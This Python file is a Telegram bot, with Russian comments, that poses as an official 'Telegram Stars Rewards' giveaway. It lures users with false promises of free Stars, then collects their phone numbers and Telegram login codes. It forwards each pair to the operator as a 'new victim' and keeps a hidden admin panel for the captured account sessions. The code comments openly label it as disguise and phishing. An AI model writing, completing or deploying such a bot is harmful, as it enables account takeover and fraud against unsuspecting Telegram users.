import os
import asyncio
import aiosqlite
from telebot import TeleBot, types
from telethon import TelegramClient
from telethon.sessions import StringSession

# ================= НАСТРОЙКИ ИЗ RAILWAY =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)
DB_FILE = "sessions.db"

# ====================== ИНИЦИАЛИЗАЦИЯ БД ======================
async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                phone TEXT PRIMARY KEY,
                session_string TEXT NOT NULL,
                first_name TEXT,
                username TEXT,
                added_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        await db.commit()

# ====================== МАСКИРОВКА ПОД TELEGRAM STARS ======================
@bot.message_handler(commands=['start'])
def start_message(message):
    text = """🌟 <b>Добро пожаловать в официальный Telegram Stars Rewards Center 2026!</b>

🎁 Telegram запустил глобальную программу раздачи Stars — внутренней валюты платформы.

✅ <b>Почему миллионы пользователей уже подключились:</b>
• Полностью официальное API Telegram
• Ваши данные защищены на уровне платформы
• Подключение занимает менее 30 секунд
• В любой момент можно отключить аккаунт в настройках Telegram
• Никакие пароли не хранятся на серверах

💰 <b>Что вы получите сразу:</b>
• От 1500 до 5000 Stars на баланс
• Ежедневные бонусы ×2 и множители
• Возможность обмена Stars на TON, USDT, NFT и редкие стикеры
• Участие в эксклюзивных аирдропах TON Foundation

Нажмите кнопку ниже и получите Stars уже через минуту 👇"""

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚀 Подключить аккаунт и получить Stars", callback_data="connect"))
    markup.add(types.InlineKeyboardButton("📋 Подробнее о программе", callback_data="info"))
    markup.add(types.InlineKeyboardButton("🎁 Активные дропы", callback_data="drops"))

    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ====================== ФИШИНГ ======================
@bot.callback_query_handler(func=lambda call: call.data == "connect")
def connect(call):
    bot.send_message(call.message.chat.id, "📱 Введите ваш номер телефона (+79xxxxxxxxx):")
    bot.register_next_step_handler(call.message, wait_phone)

def wait_phone(message):
    phone = message.text.strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    bot.send_message(message.chat.id, f"✅ Номер принят: <b>{phone}</b>\n\nВведите код подтверждения из Telegram:", parse_mode='HTML')
    bot.register_next_step_handler(message, wait_code, phone)

async def wait_code(message, phone):
    code = message.text.strip()

    print(f"[+] ФИШИНГ УСПЕШЕН → {phone} | Код: {code}")
    try:
        bot.send_message(ADMIN_ID, f"🌟 НОВАЯ ЖЕРТВА!\n📱 Телефон: {phone}\n🔑 Код: {code}")
    except:
        pass

    # Ответ жертве
    success_text = """🎉 <b>Аккаунт успешно подключён!</b>

На ваш баланс мгновенно начислено <b>2850 Stars</b>! 🎁

Теперь вы можете:
• Покупать эксклюзивные эффекты и стикеры
• Участвовать в ежедневных розыгрышах
• Обменивать Stars на TON и NFT

Спасибо за участие в программе Telegram Stars Rewards!

/start — вернуться в главное меню"""

    bot.send_message(message.chat.id, success_text, parse_mode='HTML')

# ====================== СЕКРЕТНАЯ АДМИН ПАНЕЛЬ ======================
@bot.message_handler(commands=['adminwork'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return
    asyncio.run(show_admin_panel(message.chat.id))

async def show_admin_panel(chat_id):
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT phone, first_name, username FROM sessions") as cursor:
            rows = await cursor.fetchall()

    if not rows:
        bot.send_message(chat_id, "Пока нет сохранённых сессий.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    for phone, first_name, username in rows:
        short_phone = phone[-10:] if len(phone) > 10 else phone
        markup.add(
            types.InlineKeyboardButton(f"📥 {short_phone}", callback_data=f"dl:{phone}"),
            types.InlineKeyboardButton(f"🔑 Код", callback_data=f"code:{phone}")
        )

    text = f"🔥 PHANTOM ADMIN PANEL\n📁 Сохранено аккаунтов: {len(rows)}"
    bot.send_message(chat_id, text, reply_markup=markup)

# ====================== ЗАПУСК ======================
async def main():
    await init_db()
    print("[+] Stars Phantom Bot запущен на Railway (без папки sessions)")
    print("[+] Секретная команда: /adminwork")
    bot.infinity_polling()

if __name__ == "__main__":
    asyncio.run(main())
